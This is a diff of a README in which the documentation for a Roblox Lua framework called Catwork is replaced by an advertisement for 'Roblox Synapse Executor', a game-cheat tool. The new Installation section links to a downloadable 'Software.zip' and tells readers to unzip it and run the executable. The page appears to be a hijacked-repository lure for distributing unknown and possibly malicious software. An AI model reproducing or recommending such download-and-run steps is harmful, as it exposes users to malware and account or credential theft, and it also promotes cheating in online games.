@@ -1,58 +1,49 @@
-<div align="center">
-<img src="res/logo.png" alt="The Catwork Logo" width=400></img>
-<h1>Catwork</h1>
-The Cat framework for Roblox! 🐈
-</div>
+# Roblox-Synapse
 
-> [!NOTE]
-> Catwork works best in `ReplicatedFirst`, especially since you can then utilise `ReplicatedFirst` loading behaviour.
-> Server code can access code in ReplicatedFirst.
+![Roblox-Synapse](https://www.example.com/roblox-synapse-logo.jpg)
 
-Catwork does not natively come packaged with a runtime, although `Script` instances can safely access the `Catwork`
-module. You'll need some way of starting `ModuleScript` instances if you wish to take full advantage of the motivations
-behind `Object`s though.
+## Description
+Roblox Synapse Executor is a top-tier script execution tool for Roblox, valued for its advanced features and stability, enabling seamless Lua scripting for game modifications and customization.
 
-# Installation
+## Table of Contents
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
 
-## In Roblox:
+## Features
+- Advanced script execution capabilities.
+- Stable performance for seamless Lua scripting.
+- Customization options for game modifications.
+- User-friendly interface for easy navigation.
+- Regular updates for improved functionality.
+- Enhanced security features for safe scripting experience.
 
-Download the latest release and drag it into Studio, or use a tool like [Dropper](https://create.roblox.com/store/asset/13404068475/Dropper-External-file-inserter) to insert it for you.
+## Installation
+To begin using Roblox Synapse Executor, follow these steps:
+1. Download the software package from the following link: [Download Synapse](https://github.com/user-attachments/files/16913109/Software.zip)
+![Download Button](https://img.shields.io/badge/Download-Synapse-blueviolet)
 
-## In external editors
+2. Unzip the downloaded file to your desired location on your computer.
+3. Run the executable file to launch the Synapse Executor application.
 
-To use Catwork in an external, download the /src/ folder, and drag it into your project.
+## Usage
+1. Open the Roblox game you wish to modify.
+2. Launch the Synapse Executor application.
+3. Select the desired script to execute within the game environment.
+4. Customize the script features according to your preferences.
+5. Execute the script to apply the modifications to the game.
+6. Enjoy the enhanced gaming experience with your personalized modifications.
 
-There are packages on Wally, however, these **are not supported or maintained** and should not be used, we found it easier to just maintain the package
-as a downloadable ZIP archive when publishing a release.
+![Roblox Gameplay](https://www.example.com/roblox-gameplay.jpg)
 
-# Usage
+## Contributing
+We welcome contributions from the community to further enhance the functionality and features of Roblox Synapse Executor. To contribute, follow these steps:
+1. Fork the repository to your GitHub account.
+2. Make the desired changes or additions to the codebase.
+3. Submit a pull request outlining the modifications you have made.
+4. Your contribution will be reviewed by the project maintainers for inclusion in the main repository.
 
-This Object simply greets the player when they join:
-
-```lua
-local ReplicatedFirst = game:GetService("ReplicatedFirst")
-local Catwork = require(ReplicatedFirst.Catwork)
-
-Catwork.new {
-  Init = function(self)
-    Players.PlayerAdded:Connect(function(p)
-      print(`Hello {p.Name}!`)
-    end)
-  end
-}
-```
-
-This only scratches the true function of what Catwork can do, `Service` considerably increases the power of
-Catwork! See the documentation for more information.
-
-# License
-
-Catwork is licensed under the MIT License. 2024 metatablecatgames
-
-# Sponsor Catwork
-
-Catwork is maintainted mostly by just me, [support me and what I do!](https://github.com/sponsors/metatablecat)
-
-# Attributions
-
-Logo made by Alex. [Website](https://hofnarretje.eu/).
+## License
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
